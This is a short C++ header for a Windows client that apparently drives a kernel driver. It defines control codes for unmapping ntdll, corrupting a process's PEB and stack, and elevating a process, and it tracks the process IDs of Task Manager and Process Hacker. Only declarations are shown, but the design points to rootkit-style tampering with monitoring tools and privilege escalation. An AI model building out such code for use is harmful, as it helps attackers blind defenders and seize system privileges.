#pragma once
#include <Windows.h>
#include <iostream>
#include <TlHelp32.h>
#include <set>

HANDLE hDevice;

std::set<DWORD> taskmanagerPIDlist;

#define IO_UNMAP_NTDLL       CTL_CODE(FILE_DEVICE_UNKNOWN, 0x111, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define IO_CORRUPT_PEB       CTL_CODE(FILE_DEVICE_UNKNOWN, 0x222, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define IO_CORRUPT_STACK     CTL_CODE(FILE_DEVICE_UNKNOWN, 0x333, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define IO_ELEVATE_PROCESS   CTL_CODE(FILE_DEVICE_UNKNOWN, 0x444, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)



const wchar_t* taskManagerName = L"Taskmgr.exe";
const wchar_t* processHackerName = L"ProcessHacker.exe";

int processHackerPID;
int taskManagerPID;

DWORD ctlcode;
